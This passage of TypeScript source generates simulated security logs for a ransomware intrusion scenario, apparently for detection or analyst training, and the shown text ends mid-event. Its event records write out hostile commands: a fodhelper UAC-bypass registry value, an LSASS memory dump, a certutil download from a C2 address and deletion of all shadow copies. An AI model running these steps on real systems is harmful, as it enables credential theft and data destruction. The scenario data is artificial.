  const falconProc = (id: string, ts: string, h: typeof zero | typeof server, p: NonNullable<TelemetryEvent["process"]>, o: { severity?: TelemetryEvent["severity"]; mitre?: string; description: string; email?: string }): TelemetryEvent => ({
    id, ts, source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
    hostname: h.hostname, user_email: o.email ?? (h === zero ? zero.email : undefined), src_ip: h.ip,
    severity: o.severity ?? "informational", mitre_technique: o.mitre, process: p,
    description: o.description,
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "host.name": h.hostname, "host.ip": h.ip, "user.name": p.user ?? cu },
  });
  const falconFile = (id: string, ts: string, h: typeof zero | typeof server, path: string, sha: string | undefined, size: number, w: NonNullable<TelemetryEvent["process"]>, simple: string, o: { severity?: TelemetryEvent["severity"]; mitre?: string; description: string }): TelemetryEvent => ({
    id, ts, source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
    hostname: h.hostname, user_email: h === zero ? zero.email : undefined, src_ip: h.ip,
    severity: o.severity ?? "low", mitre_technique: o.mitre,
    file: { path, ...(sha ? { sha256: sha } : {}), size }, process: w,
    description: o.description,
    raw: { "crowdstrike.event_simpleName": simple, "file.path": path, ...(sha ? { "file.hash.sha256": sha } : {}), "host.name": h.hostname, "host.ip": h.ip, "user.name": w.user ?? cu },
  });
  const sysmonProc = (id: string, ts: string, h: typeof zero | typeof server, p: NonNullable<TelemetryEvent["process"]>, o: { severity?: TelemetryEvent["severity"]; mitre?: string; description: string; raw?: Record<string, string> }): TelemetryEvent => ({
    id, ts, source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
    hostname: h.hostname, user_email: h === zero ? zero.email : undefined, src_ip: h.ip,
    severity: o.severity ?? "informational", mitre_technique: o.mitre, process: p,
    description: o.description,
    raw: { "event.code": "1", "winlog.provider_name": "Microsoft-Windows-Sysmon", "winlog.channel": "Microsoft-Windows-Sysmon/Operational", "host.ip": h.ip, ...(o.raw ?? {}) },
  });
  const falconAlert = (id: string, ts: string, h: typeof zero | typeof server, p: NonNullable<TelemetryEvent["process"]>, o: {
    severity: "high" | "critical"; mitre: string; detect: string; tactic: string; tacticId: string; technique: string; techId: string; sub?: string; file?: { path: string; sha256?: string }; description: string }): TelemetryEvent => ({
    id, ts, source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert",
    hostname: h.hostname, user_email: h === zero ? zero.email : undefined, src_ip: h.ip,
    severity: o.severity, mitre_technique: o.mitre, is_detection: true, process: p,
    ...(o.file ? { file: { path: o.file.path, ...(o.file.sha256 ? { sha256: o.file.sha256 } : {}) } } : {}),
    description: o.description,
    raw: {
      "crowdstrike.event_simpleName": "DetectionSummaryEvent",
      "crowdstrike.DetectName": o.detect,
      "crowdstrike.SeverityName": o.severity === "critical" ? "Critical" : "High",
      "crowdstrike.Tactic": o.tactic,
      "threat.tactic.id": o.tacticId,
      "crowdstrike.Technique": o.technique,
      "threat.technique.id": o.techId,
      ...(o.sub ? { "threat.technique.subtechnique.id": o.sub } : {}),
      // Detect-only policy: the sensor records the behaviour and takes no action.
      "crowdstrike.PatternDispositionDescription": "Detection, No Action",
      "crowdstrike.NetworkContainmentState": "Not Contained",
      "host.name": h.hostname, "host.ip": h.ip, "user.name": p.user ?? cu,
    },
  });
  // One short session to the C2 address as PAN-OS logs it when the session ends.
  const c2Row = (id: string, ts: string, h: typeof zero | typeof server, sport: number, dport: number, bytesOut: number, bytesIn: number, elapsed: number, severity: TelemetryEvent["severity"] = "low", note = ""): TelemetryEvent => ({
    id, ts,
    source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
    hostname: h.hostname, src_ip: h.ip, dst_ip: c2Ip, dst_port: dport, src_port: sport, protocol: "tcp", severity,
    network: { bytes_out: bytesOut, bytes_in: bytesIn },
    description: `${h.hostname} opened an outbound session from port ${sport} to ${c2Ip}:${dport}${note} (${bytesOut} bytes out, ${bytesIn} in).`,
    raw: {
      "event.action": "allow",
      "source.ip": h.ip, "destination.ip": c2Ip, "destination.port": String(dport),
      "pan.app": dport === 443 ? "ssl" : "web-browsing", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTPS",
      "url.category": "Unknown", "pan.elapsed_time": String(elapsed),
      "network.bytes_out": String(bytesOut), "network.bytes_in": String(bytesIn),
      "action_result": "allow",
    },
  });
  const winServer = (id: string, ts: string, source: "ad" | "windows_security", host: string, email: string | undefined, evType: TelemetryEvent["event_type"], severity: TelemetryEvent["severity"], description: string, raw: Record<string, string>, mitre?: string): TelemetryEvent => ({
    id, ts, source, vendor: "Windows Security", event_type: evType, hostname: host, ...(email ? { user_email: email } : {}),
    severity, mitre_technique: mitre, description,
    raw: { "winlog.channel": "Security", "winlog.provider_name": "Microsoft-Windows-Security-Auditing", ...raw },
  });
  const share = (n: number, path: string): TelemetryEvent => ({
    id: `evt_10_encrypt_${String(n).padStart(2, "0")}`, ts: T(123 * MIN + (n * 10 + 5) * SEC),
    source: "sysmon", vendor: "Microsoft Sysmon", event_type: "file_create",
    hostname: server.hostname, src_ip: server.ip, severity: "high", mitre_technique: n === 1 ? "T1486" : undefined,
    process: lockP, file: { path: `${path}${encExt}` },
    description: `wu_update.exe created ${path}${encExt}, the encrypted copy of ${path}, on FS-CORP-01.`,
    raw: { "event.code": "11", "winlog.provider_name": "Microsoft-Windows-Sysmon", "winlog.channel": "Microsoft-Windows-Sysmon/Operational", "host.ip": server.ip },
  });
  const encFiles = [
    "C:\\Shares\\Finance\\Budget_Q2_2026.xlsx", "C:\\Shares\\Finance\\Payroll_May_2026.xlsx", "C:\\Shares\\HR\\Employee_Contracts_2026.docx",
    "C:\\Shares\\HR\\Salary_Bands.xlsx", "C:\\Shares\\Contracts\\Supplier_Agreement_Apex.pdf", "C:\\Shares\\Contracts\\NDA_Template_v7.docx",
    "C:\\Shares\\Finance\\Forecast_H2_2026.xlsx", "C:\\Shares\\Finance\\Invoices_Q1_2026.xlsx",
  ];

  const events: TelemetryEvent[] = [
    // ── The day before: why a domain admin's credentials were in this workstation's memory ──
    //
    // The LSASS dump at 04:45 yields da-backup's hash, and everything downstream (the TGT
    // request, the pass-the-hash to the file server, the encryption) depends on that. A
    // helpdesk remote-support session the previous afternoon is both the realistic explanation
    // and the actual finding: a Domain Admin account was used for desktop support and its
    // session was disconnected, not logged off, so its credentials stayed cached in memory.
    winServer("evt_00_da_session", AT("05", "13:15:00"), "windows_security", zero.hostname, "da-backup@nexacorp.com", "auth_success", "informational",
      "da-backup opened a Remote Desktop session on WS-FIN-1193 the previous afternoon.", {
        "winlog.event_id": "4624", "event.code": "4624", "winlog.computer_name": "WS-FIN-1193",
        "winlog.event_data.TargetUserName": "da-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "10",
        "winlog.event_data.LogonProcessName": "User32 ",
        "winlog.event_data.AuthenticationPackageName": "Negotiate",
        "winlog.event_data.WorkstationName": "WS-ITHELP-02",
        "winlog.event_data.IpAddress": "10.10.5.22",
        "winlog.event_data.TargetLogonId": "0x5B21A7",
      }),
    winServer("evt_00b_da_disconnect", AT("05", "13:56:00"), "windows_security", zero.hostname, "da-backup@nexacorp.com", "auth_success", "informational",
      "da-backup's Remote Desktop session on WS-FIN-1193 was disconnected 41 minutes after it opened; no logoff followed.", {
        "winlog.event_id": "4779", "event.code": "4779", "winlog.computer_name": "WS-FIN-1193.nexacorp.com",
        "winlog.event_data.SubjectUserName": "da-backup",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x5B21A7",
        "winlog.event_data.SessionName": "RDP-Tcp#2",
        "winlog.event_data.ClientName": "WS-ITHELP-02",
        "winlog.event_data.ClientAddress": "10.10.5.22",
      }),
    {
      // Normal use of the file server by this workstation: c.martin's own SMB traffic during the day.
      id: "evt_rsw_baseline_smb", ts: AT("05", "14:12:40"), is_baseline: true,
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip, dst_ip: server.ip, dst_port: 445, src_port: 50644, protocol: "tcp",
      severity: "informational", network: { bytes_out: 148_000, bytes_in: 2_310_000 },
      description: "WS-FIN-1193 used the Finance share on FS-CORP-01 during the working day (c.martin opening spreadsheets).",
      raw: {
        "event.action": "allow", "source.ip": zero.ip, "destination.ip": server.ip, "destination.port": "445",
        "pan.app": "ms-ds-smb", "pan.action": "allow", "pan.rule": "Allow-Internal", "pan.elapsed_time": "312",
        "network.bytes_out": "148000", "network.bytes_in": "2310000", "action_result": "allow",
      },
    },
    winServer("evt_00_context", T(-30 * MIN), "windows_security", zero.hostname, zero.email, "auth_success", "informational",
      "c.martin logged on to WS-FIN-1193 at 02:45, outside normal business hours.", {
        // Windows Security Event 4624 - Successful Logon (unusual time: 02:45)
        "winlog.event_id": "4624", "event.code": "4624", "winlog.computer_name": "WS-FIN-1193",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "WS-FIN-1193$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        "winlog.event_data.TargetUserName": "c.martin",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-FIN-1193",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.IpAddress": zero.ip,
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.ProcessId": "0x44C",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
        "source.ip": zero.ip, "host.name": "WS-FIN-1193",
      }),
    falconProc("evt_00c_shell", T(-29 * MIN - 40 * SEC), zero, { ...explorerP, parent_name: "userinit.exe", parent_pid: 2988, cmdline: "C:\\Windows\\Explorer.EXE" },
      { description: "explorer.exe started for c.martin's interactive session on WS-FIN-1193 after logon." }),
    falconProc("evt_00d_browser", T(-45 * SEC), zero, { ...chromeP, cmdline: "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"" },
      { description: "c.martin opened Chrome on WS-FIN-1193." }),
    {
      id: "evt_01_phish", ts: T(0),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: zero.email, src_ip: senderIp,
      severity: "high", mitre_technique: "T1566.001",
      description: "c.martin received an email with a macro-enabled Word attachment (Salary_Adjustment_Notice.docm) from a domain registered 2 days ago. SPF and DKIM both failed.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "payroll@nexacorp-updates.net",
        "email.to.address": "c.martin@nexacorp.com",
        "email.subject": "Salary Adjustment Notice - Immediate Review Required",
        "email.attachment.name": "Salary_Adjustment_Notice.docm",
        "email.direction": "inbound",
        "file.size": "52480",
        "source.ip": senderIp,
        "spf.result": "fail", "dkim.result": "fail",
        "action_result": "delivered",
        "data.office365.OrgLevelAction": "Allow", "data.office365.OrgLevelPolicy": "Exchange transport rule",
      },
    },
    {
      id: "evt_01b_attachment", ts: T(0),
      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: zero.email,
      severity: "informational", mitre_technique: "T1566.001",
      description: "The message's attachment record lists Salary_Adjustment_Notice.docm (52,480 bytes) with its SHA256.",
      raw: {
        "category": "AdvancedHunting-EmailAttachmentInfo",
        "email.from.address": "payroll@nexacorp-updates.net",
        "email.to.address": "c.martin@nexacorp.com",
        "email.subject": "Salary Adjustment Notice - Immediate Review Required",
        "email.attachments.file.name": "Salary_Adjustment_Notice.docm",
        "email.attachments.file.hash.sha256": docmHash,
        "email.attachments.file.size": 52480,
        "email.direction": "inbound",
        "source.ip": senderIp,
        "action_result": "delivered",
      },
    },
    falconFile("evt_01c_docm_saved", T(25 * SEC), zero, docmPath, docmHash, 52480, chromeP, "OoxmlFileWritten",
      { description: "chrome.exe on WS-FIN-1193 saved Salary_Adjustment_Notice.docm from the webmail session to c.martin's Downloads folder (same SHA256 as the email attachment)." }),
    falconProc("evt_01d_word", T(35 * SEC), zero, { ...wordP, cmdline: `"${wordPath}" "${docmPath}"` },
      { severity: "low", description: "c.martin opened Salary_Adjustment_Notice.docm in Word on WS-FIN-1193." }),
    falconFile("evt_01e_script_drop", T(44_600), zero, scriptPath, scriptHash, 2210, wordP, "NewScriptWritten",
      { severity: "medium", mitre: "T1059.001", description: "WINWORD.EXE on WS-FIN-1193 wrote pay_adj.ps1 to c.martin's Temp folder, 0.4 seconds before PowerShell ran it." }),
    {
      id: "evt_02_macro", ts: T(45 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
      severity: "critical", mitre_technique: "T1059.001",
      description: "WINWORD.EXE on WS-FIN-1193 spawned a hidden PowerShell process with execution policy bypass, running a script from c.martin's Temp folder, 45 seconds after the phishing mail was delivered.",
      process: ps1P,
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "event.action": "process_created",
        "process.name": "powershell.exe", "process.pid": "7741",
        "process.command_line": stageCmd,
        "process.parent.name": "WINWORD.EXE", "process.parent.pid": "2244",
        "user.name": cu, "host.name": "WS-FIN-1193", "host.ip": zero.ip,
      },
    },
    falconAlert("evt_02b_office_alert", T(50 * SEC), zero, ps1P, {
      severity: "high", mitre: "T1059.001", detect: "OfficeAppSpawnsScriptInterpreter", tactic: "Execution", tacticId: "TA0002",
      technique: "Command and Scripting Interpreter: PowerShell", techId: "T1059", sub: "T1059.001",
      description: "Falcon raised a High detection on WS-FIN-1193: WINWORD.EXE launched a hidden powershell.exe with execution policy bypass. Disposition: detection only, process not stopped.",
    }),
    {
      id: "evt_02c_dns", ts: T(2 * MIN + 58 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "dns_query",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip, severity: "low",
      process: ps1P, dns: { query: c2Dom, query_type: "A", response: c2Ip, rcode: "NOERROR" },
      description: `powershell.exe on WS-FIN-1193 resolved ${c2Dom} to ${c2Ip}.`,
      raw: { "crowdstrike.event_simpleName": "DnsRequest", "dns.question.name": c2Dom, "host.name": zero.hostname, "host.ip": zero.ip },
    },
    {
      id: "evt_02d_dns_server", ts: T(2 * MIN + 58 * SEC),
      source: "dns", vendor: "Windows DNS Server", event_type: "dns_query",
      hostname: zero.hostname, src_ip: zero.ip, severity: "low",
      dns: { query: c2Dom, query_type: "A", response: c2Ip, rcode: "NOERROR" },
      description: `The internal DNS server answered ${zero.hostname}'s A query for ${c2Dom} with ${c2Ip}.`,
      raw: { "dns.question.name": c2Dom, "dns.question.type": "A", "dns.response_code": "NOERROR", "dns.resolved_ip": c2Ip, "source.ip": zero.ip },
    },
    {
      id: "evt_03_c2", ts: T(3 * MIN),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: zero.hostname, src_ip: zero.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { domain: c2Dom, url: `https://${c2Dom}/updates`, bytes_out: 1024, bytes_in: 8192 },
      description: `powershell.exe on WS-FIN-1193 began connecting to ${c2Dom}. The domain was registered 2 days ago.`,
      raw: {
        "event.action": "network-connection-allowed",
        "source.ip": zero.ip, "source.port": "51204",
        "destination.ip": c2Ip, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "url.full": `https://${c2Dom}/updates`, "url.domain": c2Dom,
        "url.category": "newly-registered-domain",
        "pan.app": "ssl", "pan.action": "alert", "pan.rule": "Outbound-Web-Users",
        "action_result": "allow",
      },
    },
    // The check-ins that follow: every minute at first, then every ten minutes once the operator has taken over.
    ...[4, 5, 6, 7].map((m, i) => c2Row(`evt_03a_beacon_${i + 1}`, T(m * MIN), zero, 51210 + i * 6, 443, 1024, 8192, 2)),
    ...[17, 27, 37, 47, 57, 67, 77].map((m, i) => c2Row(`evt_03a_beacon_${i + 5}`, T(m * MIN), zero, 51420 + i * 9, 443, 1024, 8192, 2)),
    // Privilege escalation. Opening lsass.exe with PROCESS_ALL_ACCESS needs
    // SeDebugPrivilege, which a medium-integrity process does not hold - so the
    // beacon has to elevate first. The fodhelper UAC bypass is the step that
    // makes the credential dump below possible, and it leaves its own tracks.
    {
      id: "evt_03b_uac_cmd", ts: T(87 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "registry_set",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
      severity: "high", mitre_technique: "T1548.002",
      process: ps1P,
      registry: {
        path: "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
        key: "(Default)",
        value: `${psPath} -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ${scriptPath}`,
      },
      description: "The default value of the ms-settings shell-open command key in c.martin's hive on WS-FIN-1193 was set to a PowerShell command line.",
      raw: {
        "event.code": "13",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.EventType": "SetValue",
        "host.ip": zero.ip,
      },
    },
    {
      id: "evt_03b_uac_regkey", ts: T(87 * MIN + 1_000),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "registry_set",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
      severity: "high", mitre_technique: "T1548.002",
      process: ps1P,
      registry: { path: "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command", key: "DelegateExecute", value: "" },
      description: "A DelegateExecute value was written under the ms-settings shell-open key in c.martin's registry hive on WS-FIN-1193.",
      raw: {
        "event.code": "13",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.EventType": "SetValue",
        "host.ip": zero.ip,
      },
    },
    {
      id: "evt_03c_uac_bypass", ts: T(88 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
      severity: "high", mitre_technique: "T1548.002",
      process: fodP,
      description: "fodhelper.exe started at High integrity on WS-FIN-1193 with powershell.exe as its parent, one minute after the registry write.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.OriginalFileName": "FODHELPER.EXE",
        "winlog.event_data.Company": "Microsoft Corporation",
        "host.ip": zero.ip,
      },
    },
    falconProc("evt_03d_elevated_ps", T(88 * MIN + 1_000), zero, ps2P,
      { severity: "medium", mitre: "T1548.002", description: "fodhelper.exe started a second powershell.exe, at High integrity, running the same pay_adj.ps1 as the first." }),
    falconProc("evt_04_lsass", T(90 * MIN), zero, dumpP, {
      severity: "critical", mitre: "T1003.001",
      description: "rundll32.exe on WS-FIN-1193 used comsvcs.dll to dump lsass.exe memory to mem.dmp.",
    }),
    falconAlert("evt_04a_lsass_alert", T(90 * MIN + 5_000), zero, dumpP, {
      severity: "critical", mitre: "T1003.001", detect: "CredentialAccessLsassMemoryRead", tactic: "Credential Access", tacticId: "TA0006",
      technique: "OS Credential Dumping: LSASS Memory", techId: "T1003", sub: "T1003.001", file: { path: "C:\\Windows\\Temp\\mem.dmp" },
      description: "CrowdStrike detected rundll32.exe on WS-FIN-1193 using comsvcs.dll to read lsass.exe memory into mem.dmp. Disposition: detection only, process not stopped.",
    }),
    winServer("evt_04b_kerberos_tgt", T(92 * MIN), "ad", "DC-CORP-01", zero.email, "kerberos_tgt", "critical",
      "A Kerberos TGT for domain admin account da-backup was requested from WS-FIN-1193 using RC4 encryption, two minutes after the LSASS dump.", {
        "event.code": "4768", "winlog.event_id": "4768",
        "winlog.event_data.TargetUserName": "da-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.ServiceName": "krbtgt",
        "winlog.event_data.TicketOptions": "0x40810010",
        "winlog.event_data.TicketEncryptionType": "0x17",
        "winlog.event_data.IpAddress": zero.ip,
        "winlog.event_data.IpPort": "51888",
        "winlog.event_data.Status": "0x0",
        "winlog.event_data.PreAuthType": "2",
      }, "T1550.002"),
    winServer("evt_04c_domain_admin_logon", T(93 * MIN), "ad", "DC-CORP-01", "da-backup@nexacorp.com", "auth_success", "critical",
      "Domain admin account da-backup authenticated to DC-CORP-01 via a network logon (Type 3) originating from WS-FIN-1193.", {
        "event.code": "4624", "winlog.event_id": "4624",
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.TargetUserName": "da-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonProcessName": "NtLmSsp",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": zero.hostname,
        "winlog.event_data.IpAddress": zero.ip,
        "winlog.event_data.IpPort": "51889",
        "winlog.event_data.SubjectUserName": "-",
        "winlog.event_data.SubjectDomainName": "-",
        "winlog.event_data.KeyLength": "0",
      }, "T1078"),
    // Discovery from the elevated beacon, between the domain-admin logon and the move to the file server.
    falconProc("evt_04d_nltest", T(95 * MIN + 10 * SEC), zero, { name: "nltest.exe", pid: 10312, path: "C:\\Windows\\System32\\nltest.exe", parent_name: "powershell.exe", parent_pid: 8216, cmdline: "nltest.exe /dclist:nexacorp.com", user: cu, integrity: "high" },
      { severity: "medium", mitre: "T1018", description: "nltest.exe listed the domain controllers of nexacorp.com from WS-FIN-1193." }),
    falconProc("evt_04e_netgroup", T(97 * MIN + 5 * SEC), zero, { name: "net.exe", pid: 10388, path: "C:\\Windows\\System32\\net.exe", parent_name: "powershell.exe", parent_pid: 8216, cmdline: "net.exe group \"Domain Admins\" /domain", user: cu, integrity: "high" },
      { severity: "medium", mitre: "T1087.002", description: "net.exe listed the members of the Domain Admins group from WS-FIN-1193." }),
    falconProc("evt_04f_netview", T(100 * MIN + 30 * SEC), zero, { name: "net.exe", pid: 10452, path: "C:\\Windows\\System32\\net.exe", parent_name: "powershell.exe", parent_pid: 8216, cmdline: "net.exe view \\\\FS-CORP-01", user: cu, integrity: "high" },
      { severity: "medium", mitre: "T1135", description: "net.exe listed the shares of FS-CORP-01 from WS-FIN-1193." }),
    {
      id: "evt_05_smb_lateral", ts: T(105 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
      hostname: zero.hostname, user_email: zero.email,
      src_ip: zero.ip, dst_ip: server.ip, dst_port: 445, src_port: 52797, protocol: "tcp",
      severity: "critical", mitre_technique: "T1021.002",
      description: `WS-FIN-1193 (${zero.ip}) opened an SMB connection to FS-CORP-01 (${server.ip}).`,
      raw: {
        "crowdstrike.event_simpleName": "NetworkConnectIP4",
        "source.ip": zero.ip, "source.port": "52797",
        "destination.ip": server.ip, "destination.port": "445",
        "host.name": zero.hostname, "host.ip": zero.ip,
      },
    },
    // The target side of the same hop: the logon, the ADMIN$ write, the service install.
    winServer("evt_05b_fs_logon", T(105 * MIN + 20 * SEC), "windows_security", server.hostname, "da-backup@nexacorp.com", "auth_success", "high",
      "da-backup logged on to FS-CORP-01 over the network (Type 3, NTLM) from WS-FIN-1193.", {
        "event.code": "4624", "winlog.event_id": "4624", "host.ip": server.ip,
        "winlog.event_data.LogonType": "3",
        "winlog.event_data.TargetUserName": "da-backup",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonProcessName": "NtLmSsp ",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.WorkstationName": zero.hostname,
        "winlog.event_data.IpAddress": zero.ip,
        "winlog.event_data.IpPort": "52797",
      }, "T1021.002"),
    winServer("evt_05c_admin_share", T(105 * MIN + 40 * SEC), "windows_security", server.hostname, "da-backup@nexacorp.com", "file_access", "high",
      "da-backup wrote PSEXESVC.exe to the ADMIN$ share on FS-CORP-01 from WS-FIN-1193.", {
        "event.code": "5145", "winlog.event_id": "5145", "winlog.computer_name": "FS-CORP-01.nexacorp.com", "host.ip": server.ip,
        "winlog.event_data.SubjectUserName": "da-backup",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.ObjectType": "File",
        "winlog.event_data.IpAddress": zero.ip,
        "winlog.event_data.IpPort": "52798",
        "winlog.event_data.ShareName": "\\\\*\\ADMIN$",
        "winlog.event_data.ShareLocalPath": "\\??\\C:\\Windows",
        "winlog.event_data.RelativeTargetName": "PSEXESVC.exe",
        "winlog.event_data.AccessMask": "0x12019f",
        "winlog.event_data.AccessReason": "-",
      }, "T1021.002"),
    winServer("evt_05d_service_install", T(105 * MIN + 55 * SEC), "windows_security", server.hostname, undefined, "service_install", "high",
      "A service named PSEXESVC, running %SystemRoot%\\PSEXESVC.exe as LocalSystem, was installed on FS-CORP-01.", {
        "event.code": "7045", "winlog.event_id": "7045", "winlog.channel": "System", "winlog.provider_name": "Service Control Manager", "host.ip": server.ip,
        "winlog.event_data.ServiceName": "PSEXESVC",
        "winlog.event_data.ImagePath": "%SystemRoot%\\PSEXESVC.exe",
        "winlog.event_data.ServiceType": "user mode service",
        "winlog.event_data.StartType": "demand start",
        "winlog.event_data.AccountName": "LocalSystem",
      }, "T1569.002"),
    {
      id: "evt_06_psexec", ts: T(106 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      hostname: server.hostname, user_email: server.email, src_ip: server.ip,
      severity: "critical", mitre_technique: "T1569.002",
      process: psexeP,
      file: { path: "C:\\Windows\\PSEXESVC.exe", sha256: psxHash },
      description: "PSEXESVC.exe was installed and launched as SYSTEM on FS-CORP-01, delivered remotely from WS-FIN-1193 over the ADMIN$ share.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.FileVersion": "2.43",
        "winlog.event_data.Product": "Sysinternals PsExec",
        "winlog.event_data.Company": "Sysinternals - www.sysinternals.com",
        "winlog.event_data.OriginalFileName": "psexesvc.exe",
        "host.ip": server.ip,
      },
    },
    // The payload is pulled onto the file server with the OS's own downloader.
    sysmonProc("evt_rsw_download_cmd", T(109 * MIN + 50 * SEC), server, certutilP,
      { severity: "high", mitre: "T1105", description: `certutil.exe, launched by PSEXESVC.exe, downloaded wu.bin from ${c2Ip} to C:\\Windows\\Temp\\wu_update.exe on FS-CORP-01.` }),
    // ── CORRELATED: Firewall - the download from FS-CORP-01 to the raw C2 address ─────────────
    {
      id: "evt_rsw_fw_server_c2", ts: T(110 * MIN),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "high",
      mitre_technique: "T1071.001",
      src_ip: server.ip, dst_ip: c2Ip, dst_port: 80, src_port: 61117,
      hostname: server.hostname,
      network: { bytes_out: 1180, bytes_in: 2_415_616 },
      description: `FS-CORP-01 downloaded 2.3 MB over HTTP from ${c2Ip}.`,
      raw: {
        "event.action": "allow",
        "source.ip": server.ip,
        "destination.ip": c2Ip,
        "destination.port": "80",
        "pan.app": "web-browsing",
        "pan.action": "allow",
        "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "pan.elapsed_time": "9",
        "url.category": "Unknown",
        "network.bytes_out": "1180",
        "network.bytes_in": "2415616",
      },
    },
    falconFile("evt_rsw_payload_written", T(110 * MIN + 1_000), server, payloadPath, rswHash, 2_415_616, certutilP, "PeFileWritten",
      { severity: "high", mitre: "T1105", description: "certutil.exe wrote wu_update.exe to C:\\Windows\\Temp on FS-CORP-01." }),

    // ── CORRELATED: VSS snapshot status BEFORE deletion (backup was available) ───
    {
      id: "evt_rsw_vss_before", ts: T(119 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon",
      event_type: "process_create", severity: "informational",
      hostname: server.hostname, src_ip: server.ip,
      process: { name: "vssadmin.exe", pid: 6602, path: "C:\\Windows\\System32\\vssadmin.exe", parent_name: "PSEXESVC.exe", parent_pid: 3310, cmdline: "vssadmin list shadows", user: sys, integrity: "system" },
      description: "vssadmin.exe ran list shadows on FS-CORP-01 under PSEXESVC.exe, returning 12 shadow copies.",
      raw: {
        "event.code": "1",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "host.ip": server.ip,
      },
    },
    {
      id: "evt_07_vssadmin", ts: T(120 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: server.hostname, src_ip: server.ip,
      severity: "critical", mitre_technique: "T1490",
      process: {
        name: "vssadmin.exe", pid: 7712, path: "C:\\Windows\\System32\\vssadmin.exe", parent_name: "PSEXESVC.exe", parent_pid: 3310,
        cmdline: "vssadmin.exe delete shadows /all /quiet",
        user: sys, integrity: "system",
      },
      description: "vssadmin.exe, launched by PSEXESVC.exe, deleted all 12 Volume Shadow Copies on FS-CORP-01.",
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "event.action": "process_created",
        "process.name": "vssadmin.exe", "process.pid": "7712",
        "process.command_line": "vssadmin.exe delete shadows /all /quiet",
        "process.parent.name": "PSEXESVC.exe", "process.parent.pid": "3310",
        "user.name": sys, "host.name": "FS-CORP-01", "host.ip": server.ip,
      },
    },
    {
      id: "evt_08_log_clear", ts: T(121 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
      hostname: server.hostname, src_ip: server.ip,
      severity: "high", mitre_technique: "T1685.005",
      process: {
        name: "cmd.exe", pid: 8841, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "PSEXESVC.exe", parent_pid: 3310,
